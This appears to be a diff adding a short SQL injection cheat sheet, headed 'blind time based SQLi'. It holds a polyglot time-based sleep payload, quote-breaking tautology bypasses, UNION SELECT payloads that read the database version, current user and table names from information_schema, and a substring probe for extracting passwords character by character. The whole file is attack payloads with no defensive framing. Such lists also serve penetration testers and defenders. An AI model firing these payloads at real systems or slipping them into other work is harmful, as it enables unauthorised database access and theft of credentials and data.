@@ -1,0 +1,10 @@
+blind time based SQLi
+
+(select(0)from(select(sleep(6)))v)/*1%2B(select(0)from(select(sleep(6)))v)%2B'%5C"%2B(select(0)from(select(sleep(6)))v) 
+
+') or ('a'='a and hi") or ("a"="a
+'UNION ALL SELECT 1, @@version;#
+'UNION ALL SELECT system_user(),user();#
+'UNION select table_schema, table_name
+FROMinformation_Schema.tables;#
+admin' and substring(password/text(),1,1)='7
